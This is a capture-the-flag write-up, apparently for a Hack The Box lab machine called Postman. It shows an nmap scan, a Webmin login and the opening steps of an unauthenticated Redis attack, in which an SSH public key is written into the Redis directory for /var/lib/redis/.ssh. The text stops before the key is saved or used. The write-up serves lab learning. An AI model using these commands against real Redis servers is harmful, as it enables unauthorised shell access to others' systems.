![postman](https://user-images.githubusercontent.com/66635295/177882324-7b24b663-8911-4c1c-81c6-85fbc14f3ea8.png)

**RECON**
---
**Unfinished Website**
![recon](https://user-images.githubusercontent.com/66635295/177882332-fd817d49-3650-4a0b-b8cf-9bd12907a41d.png)

**Nmap Scan**
<pre>nmap –p- -A -T4 10.10.10.160</pre>
-allports -version -Aggressive

Port 6379 Redis and Port 1000 Webpage
![nmap](https://user-images.githubusercontent.com/66635295/177882433-ba2d38f8-69fc-49e7-99ff-10ab7c868bd8.png)

**Webpage check**

Wepbpage shows an error, link does not work 
![10000](https://user-images.githubusercontent.com/66635295/177882646-5ebf6232-adf3-4e15-8cdd-b284ba8791f7.png)

Navigating to the proper page reveals Webmin login 
![webmin](https://user-images.githubusercontent.com/66635295/177882796-f0ff7900-9296-4471-b394-01b121af3ef9.png)

**Redis Install**
<pre> sudo apt-get install redis-tools </pre>
![redis install](https://user-images.githubusercontent.com/66635295/177883042-2adb0cbf-6e2c-44bc-a428-e99c52c57325.png)

**Redis Host**
<pre>redis-cli -h 10.10.10.160</pre>
![redis-h](https://user-images.githubusercontent.com/66635295/178047298-847ee0b2-b196-4674-ab2e-499e5b6a23fc.png)

**Directory Check**
<pre>CONFIG GET dir</pre>
<pre> CONFIG SET dir /var/lib/redis/.ssh![redis-h]
(https://user-images.githubusercontent.com/66635295/178054227-24f483cd-851e-4e7d-9feb-120da1f1ff95.png)


**Generate ssh key**
<pre>ssh-keygen</pre>
![sshgen](https://user-images.githubusercontent.com/66635295/178054662-4469fc0a-1040-438b-9c44-6c62b8568dfc.png)

Copy key to .txt file
<pre> (echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > key.txt  </pre>            
![keytxt](https://user-images.githubusercontent.com/66635295/178055503-d0f774e4-6c69-409a-99cf-c0eac96f8106.png)

Send key to host
<pre>cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key</pre>
![rkey](https://user-images.githubusercontent.com/66635295/178055971-545373bc-d97d-4ea1-bc7b-07574185d1e4.png)
